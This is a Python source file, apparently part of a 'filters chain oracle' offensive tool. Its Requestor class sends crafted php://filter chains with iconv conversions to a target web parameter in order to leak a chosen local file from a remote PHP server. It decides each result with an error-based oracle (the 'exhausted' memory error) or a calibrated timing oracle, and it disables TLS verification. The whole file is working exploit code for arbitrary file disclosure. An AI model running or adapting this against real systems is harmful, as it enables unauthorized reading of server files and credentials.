import json
import requests
import time
from filters_chain_oracle.core.verb import Verb
import cloudscraper
"""
Class Requestor, defines all the request logic.
"""
class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        if in_chain != "":
            print("[*] The following chain will be in each request : {}".format(in_chain))
            in_chain = "|convert.iconv.{}".format(in_chain)
        self.in_chain = in_chain
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        self.instantiate_session()
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False
        
    """
    Instantiates a requests session for optimization
    """
    def instantiate_session(self):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False



    def join(self, *x):
        return '|'.join(x)

    """
    Used to see how much time a 500 error takes to calibrate the timing attack
    """
    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    """
    Returns the response of a request defined with all options
    """
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)
        data = {
            self.parameter: f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        }
        merged_data = {key: value for (key, value) in (data.items() | self.data.items())}
        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                requ = self.session.post(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.JSONPOST:
               
                jsonData = {"parameters": {"variableName": "ccc", "viewFile": f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'}}
                requ = self.session.post(self.target, json=jsonData)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    """
    Used to determine if the answer trigged the error based oracle
    TODO : increase the efficiency of the time based oracle
    """
    def error_oracle(self, s):
        requ = self.req_with_response(s)
        if self.time_based_attack:
            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
        
        return 'exhausted' in requ.text